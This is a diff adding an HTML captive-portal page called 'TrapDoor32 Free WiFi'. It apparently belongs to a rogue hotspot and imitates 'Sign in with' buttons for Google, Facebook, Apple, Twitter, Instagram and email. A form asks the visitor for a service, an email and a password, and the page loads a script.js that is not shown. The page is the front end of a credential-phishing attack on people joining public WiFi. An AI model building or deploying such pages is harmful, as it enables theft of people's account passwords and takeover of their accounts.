@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>TrapDoor32 Free WiFi</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <div class="container">
+    <h1>Welcome to Free WiFi</h1>
+
+    <button class="signin-btn" data-service="google">
+      <img src="icons/google.svg"><span>Sign in with Google</span>
+    </button>
+    <button class="signin-btn" data-service="facebook">
+      <img src="icons/facebook.svg"><span>Sign in with Facebook</span>
+    </button>
+    <button class="signin-btn" data-service="apple">
+      <img src="icons/apple.svg"><span>Sign in with Apple</span>
+    </button>
+    <button class="signin-btn" data-service="twitter">
+      <img src="icons/twitter.svg"><span>Sign in with Twitter</span>
+    </button>
+    <button class="signin-btn" data-service="instagram">
+      <img src="icons/instagram.svg"><span>Sign in with Instagram</span>
+    </button>
+    <button class="signin-btn" data-service="email">
+      <img src="icons/mail.svg"><span>Sign in with Email</span>
+    </button>
+
+    <div id="login-form">
+      <select id="service">
+        <option value="google">Google</option>
+        <option value="facebook">Facebook</option>
+        <option value="apple">Apple</option>
+        <option value="twitter">Twitter</option>
+        <option value="instagram">Instagram</option>
+        <option value="email">Email</option>
+      </select>
+      <input id="user" type="text" placeholder="Email">
+      <input id="pass" type="password" placeholder="Password">
+      <button id="btnLogin">Login</button>
+    </div>
+  </div>
+  <script src="script.js"></script>
+</body>
+</html>
